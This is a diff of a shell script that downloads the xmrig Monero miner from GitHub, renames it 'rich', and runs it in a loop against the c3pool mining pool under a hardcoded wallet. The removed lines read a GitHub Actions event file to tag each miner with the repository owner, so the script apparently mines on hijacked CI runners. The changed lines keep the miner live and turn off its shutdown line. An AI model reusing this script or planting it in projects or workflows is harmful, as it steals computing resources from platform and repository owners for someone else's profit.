@@ -2,10 +2,7 @@
 
 echo =============================== start ===============================
 jsid=role
-[ -n $GITHUB_EVENT_PATH ] || {
-    echo asssss
-    jsid=`cat $GITHUB_EVENT_PATH | jq ".repository.owner.login" | sed 's/\"//g'`
-}
+[ -n $2 ] && jsid=$2
 jswallet="8C6cNDQ2bYdLSHjzQjF8hV5sx8erdkYgv6dyxyn1Snsh1PNNcWAB2A6QzpfxB7coERU7XQDvZvnYfJxvcAqyUvDfVUBZ7ju"
 jssleeptime="100"
 jspoolserver="mine.c3pool.com:15555"
@@ -13,7 +10,7 @@ jspoolcmd="-p id-$jsid -k"
 
 echo $jswallet $jsxmrigname $jssleeptime $jspoolserver $jspoolcmd
 
-[ -n "$LOCALTEST" ] || sudo apt-get install libuv1-dev libssl-dev libhwloc-dev -y
+#[ -n "$LOCALTEST" ] || sudo apt-get install libuv1-dev libssl-dev libhwloc-dev -y
 
 [ -f "./rich" ] || {
     curl -o xmrig.tgz -s -L  https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-static-x64.tar.gz
@@ -31,6 +28,6 @@ echo "./rich -o $jspoolserver -u $jswallet $jspoolcmd"
         sleep 60
     done
 }
-[ x"$1" == "xrun" ] && killall rich
+#[ x"$1" == "xrun" ] && killall rich
 
 echo ===============================  end  ===============================
